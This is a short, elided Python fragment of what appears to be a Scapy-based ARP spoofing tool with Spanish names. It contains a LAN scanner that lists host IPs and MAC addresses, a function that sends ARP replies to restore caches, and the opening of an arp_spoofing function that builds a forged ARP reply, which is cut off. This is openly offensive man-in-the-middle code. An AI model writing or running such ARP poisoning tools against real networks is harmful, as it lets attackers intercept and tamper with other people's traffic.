...
def scanner_red(rango, gateway):
    ...
    for a in answers:
        if a != gateway:
            print(
                "[{}+{}] HOST: {} MAC: {}".format(
                    Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, a[1].psrc, a[1].hwsrc)
            )
            lista_host.update({a[1].psrc: a[1].hwsrc})
...
def restore_arp(destip, sourceip, hwsrc, hwdst):
    dest_mac = hwdst
    source_mac = hwsrc
    packet = ARP(op=2, pdst=destip, psrc=sourceip, hwsrc=source_mac)
    send(packet, verbose=False)


def arp_spoofing(hwdst, pdst, psrc):
    spoofer_packet = ARP(op=2, hwdst=hwdst, pdst=pdst)
